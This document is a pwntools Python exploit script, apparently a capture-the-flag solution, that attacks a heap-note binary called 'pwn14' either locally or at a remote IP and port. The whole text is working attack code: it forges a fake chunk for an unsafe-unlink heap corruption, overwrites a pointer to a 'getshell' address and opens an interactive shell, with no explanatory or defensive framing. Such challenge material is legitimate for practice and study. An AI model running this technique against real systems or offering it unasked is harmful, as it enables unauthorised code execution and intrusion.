from pwn import *
local  = 1
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn14")
else:
    a=remote("50.3.232.201",31280)
def debug():
    gdb.attach(a,'''
    
    ''')
def menu(idx):
    a.recvuntil("Your choice : ")
    a.sendline(str(idx))
def add(size,content):
    menu(1)
    a.recvuntil("Size of note : ")
    a.sendline(str(size))
    a.recvuntil("Content of note:")
    a.send(content)
def delete(idx):
    menu(3)
    a.recvuntil("Index :")
    a.sendline(str(idx))
def edit(idx,size,content):
    menu(2)
    a.recvuntil("Index :")
    a.sendline(str(idx))
    a.recvuntil("Size of note : ")
    a.sendline(str(size))
    a.recvuntil("Content of note : ")
    a.send(content)
ptr=0x4040C0
getshell=0x4040A0
#debug
add(0xf8,'A')#0
add(0xf8,'A')#1
add(0xf8,'A')#2
add(0xf8,'A')#3
add(0xf8,'A')#4
payload=p64(0)+p64(0xf0)
payload+=p64(ptr-0x18)
payload+=p64(ptr-0x10)
payload+=(0xf0-32)*'a'
payload+=p64(0xf0)+p64(0x100)
edit(0,0x100,payload)
delete(1)
payload=p64(0x100)+p64(0x100)+p64(0x100)+p64(getshell)
edit(0,0x100,payload)
edit(0,0x100,p64(0x7e4))
menu(70)
a.interactive()
